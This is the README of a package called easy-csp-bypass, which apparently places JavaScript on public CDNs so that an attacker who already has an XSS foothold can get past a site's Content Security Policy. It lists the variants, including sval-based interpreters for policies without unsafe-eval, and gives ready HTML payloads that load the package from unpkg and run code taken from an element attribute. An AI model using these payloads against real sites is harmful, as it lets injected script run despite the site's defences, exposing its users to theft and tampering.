# easy-csp-bypass

Just a fun project to see if this code can end up in some CDN, so it would be easier to exploit XSS with CSP.

## How to use ?

Well, it depends.
If you are lucky enough to find unsafe-eval in the CSP configuration, you can use those scenario:

- Classic => /dist/classic.js
- Classic-infinite => /dist/classic-infinite.js
- Url => /dist/url.js

If you can't use eval() because unsafe-eval is not in the configuration, well it's not over !!
I found a Javascript interpreter called [sval](https://github.com/Siubaak/sval).
It can easily bypass the unsafe-eval restriction :) !

- Classic => /dist/sval-classic.js
- Classic-infinite => /dist/sval-infinite.js
- Url => /dist/sval-url.js

## Example

If you have an XSS on a website with CSP, search in the directive 'script-src' for [unpkg.com](https://unpkg.com/) or [jsdeliver](https://www.jsdelivr.com/).
If these domain are whitelist, you win !

```html
  <script src="https://unpkg.com/csp-bypass@1.0.2-0/dist/classic.js"></script>
  <br csp="alert(1)">
```

if 'unsafe-eval' is missing use the sval one:

```html
  <script src="https://unpkg.com/csp-bypass@1.0.2-0/dist/sval-classic.js"></script>
  <br csp="alert(1)">
```